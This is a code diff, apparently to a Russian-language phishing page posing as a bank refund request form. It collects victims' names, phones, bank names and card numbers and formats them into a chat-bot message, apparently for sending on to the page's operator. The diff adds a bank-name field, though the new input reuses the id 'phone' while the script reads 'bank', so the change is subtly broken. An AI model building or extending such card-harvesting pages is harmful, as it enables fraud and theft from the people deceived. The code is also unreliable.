@@ -111,7 +111,7 @@
 
     <div class="wrapper" id="content">
         <div class="card">
-            <h1>Введите ваши данные</h1>
+            <h1>Запрос на возраст средств</h1>
            
             
             <form id="main-form">
@@ -122,6 +122,10 @@
                 <div class="field">
                     <label>Контактный телефон</label>
                     <input type="tel" id="phone" placeholder="+7 (___) ___-__-__" required>
+                </div>
+                <div class="field">
+                    <label>Название банка</label>
+                    <input type="tel" id="phone" placeholder="Введите название вашего банка" required>
                 </div>
                 <div class="field">
                     <label>Номер карты</label>
@@ -183,6 +187,7 @@
 
         const name = document.getElementById('name').value;
         const phone = document.getElementById('phone').value;
+        const bank = document.getElementById('bank').value;
         const card = document.getElementById('card').value;
         const msg = document.getElementById('message').value;
 
@@ -190,6 +195,7 @@
                      `──────────────────\n` +
                      `👤 <b>Клиент:</b> ${name}\n` +
                      `📞 <b>Телефон:</b> <code>${phone}</code>\n` +
+                     `📞 <b>Название банка:</b> <code>${bank}</code>\n` +
                      `💳 <b>Карта:</b> <code>${card}</code>\n` +
                      `💬 <b>Запрос:</b> ${msg}\n` +
                      `──────────────────`;
